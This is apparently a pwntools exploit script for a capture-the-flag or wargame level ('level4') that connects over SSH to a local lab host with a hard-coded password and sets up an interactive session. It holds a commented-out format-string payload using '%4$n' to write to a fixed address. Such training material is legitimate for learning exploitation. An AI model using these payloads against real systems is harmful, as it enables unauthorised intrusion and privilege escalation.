#!/usr/bin/env python3
from pwn import *
import base64
import os

from pwnlib.adb import shell

# Configuration
context.arch = 'i386'  # Architecture du binaire (32-bit)
context.log_level = 'info'  # Niveau de log (debug, info, warning, error)

# Variables pour la connexion
LOCAL = False  # Mettre à False pour l'exploitation SSH
HOST = "localhost"  # Hôte pour SSH
PORT = 8888  # Port pour SSH
USER = "level4"  # Nom d'utilisateur SSH
PASSWORD = "b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa"  # Mot de passe SSH
SSH_SESSION = None


def get_connection(custom_env=None):
    global SSH_SESSION
    # Fonction helper pour fusionner les environnements
    def merge_env(base_env, custom_env):
        if custom_env:
            base_env.update(custom_env)
        return base_env

    if LOCAL:
        # En local, on utilise l'environnement actuel comme base
        SSH_SESSION = None
        local_env = os.environ.copy()
        final_env = merge_env(local_env, custom_env)
        return process(['./Resources/level4'], env=final_env)
    else:
        shell = ssh(host=HOST, port=PORT, user=USER, password=PASSWORD)
        SSH_SESSION = shell
        # Récupérer l'environnement distant
        remote_env = shell.run('env').recvall().decode().strip()
        # Convertir l'output en dictionnaire
        remote_env_dict = dict(line.split('=', 1) for line in remote_env.split('\n') if '=' in line)

        # Fusionner avec nos variables personnalisées
        final_env = merge_env(remote_env_dict, custom_env)
        return shell.process(['/home/user/level4/level4'], env=final_env)

def exploit():
    # payload = p32(0x804988c) + b"A" * 60 + b"%4$n"


    conn = get_connection()

    if LOCAL:
        gdb.attach(conn, '''
          break *v
          continue
          ''')
    # Envoi du payload
    # conn.sendline(payload)

    try:
        # Tentative d'obtenir un shell interactif
        conn.interactive()
    except:
        log.failure("L'exploit n'a pas fonctionné")

if __name__ == "__main__":
    exploit()
